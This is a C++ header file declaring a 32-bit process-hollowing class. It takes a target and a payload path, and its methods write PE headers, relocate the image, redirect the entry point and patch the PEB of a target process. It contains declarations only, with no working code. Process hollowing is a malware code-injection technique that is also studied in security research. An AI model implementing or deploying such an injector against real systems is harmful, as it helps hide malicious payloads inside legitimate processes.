#include "HollowingFunctions.hpp"

#ifndef HOLLOWING_32_BIT_H
#define HOLLOWING_32_BIT_H

class Hollowing32Bit : public HollowingFunctions
{
public:
    Hollowing32Bit(const std::string& targetPath, const std::string& payloadPath);
    void hollow() override;

private:
    void WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE sourceFileContents) override;
    void UpdateTargetProcessEntryPoint(PVOID newEntryPointAddress) override;
    PIMAGE_DATA_DIRECTORY GetPayloadDirectoryEntry(DWORD directoryID) override;
    PIMAGE_SECTION_HEADER FindTargetProcessSection(const std::string& sectionName) override;
    void RelocateTargetProcess(ULONGLONG baseAddressesDelta, PVOID processBaseAddress) override;
    void ProcessTargetRelocationBlock(PBASE_RELOCATION_BLOCK baseRelocationBlock, PBASE_RELOCATION_ENTRY blockEntries,
        PVOID processBaseAddress, ULONGLONG baseAddressesDelta) override;
    void UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress) override;
    ULONG GetProcessSubsystem(HANDLE process) override;
    WORD GetPEFileSubsystem(const PBYTE fileBuffer) override;
    bool AreProcessesCompatible() override;
};

#endif